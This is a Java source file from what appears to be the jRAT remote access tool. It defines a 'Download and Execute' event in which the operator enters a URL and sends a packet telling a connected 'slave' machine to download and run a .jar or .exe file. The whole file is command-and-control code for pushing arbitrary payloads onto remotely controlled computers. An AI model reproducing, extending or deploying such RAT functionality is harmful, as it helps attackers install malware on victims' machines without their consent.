package pro.jrat.client.events;

import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

import pro.jrat.client.Slave;
import pro.jrat.client.packets.outgoing.Packet17DownloadExecute;
import pro.jrat.client.utils.IconUtils;
import pro.jrat.client.utils.Utils;

public class DownloadAndExecEvent extends Event {

	public ImageIcon icon = IconUtils.getIcon(getIcon());
	public String url;
	public boolean jar;

	public DownloadAndExecEvent(String name) {
		super(name);
	}

	public Object[] getDisplayData() {
		return new Object[] { icon, super.name, toString(), url, jar ? ".jar" : ".exe" };
	}

	public void perform(Slave slave) {
		slave.addToSendQueue(new Packet17DownloadExecute(url, jar ? ".jar" : ".exe"));
	}

	public String toString() {
		return "Download and Execute";
	}

	public boolean add() {
		String result = Utils.showDialog("Download URL", "Input URL to download and execute");
		if (result == null) {
			return false;
		}
		if (!result.startsWith("http://")) {
			JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
			return false;
		}
		jar = result.trim().endsWith(".jar");
		url = result.trim().replace(" ", "%20");
		return true;
	}

	public String getIcon() {
		return "down_arrow";
	}

}
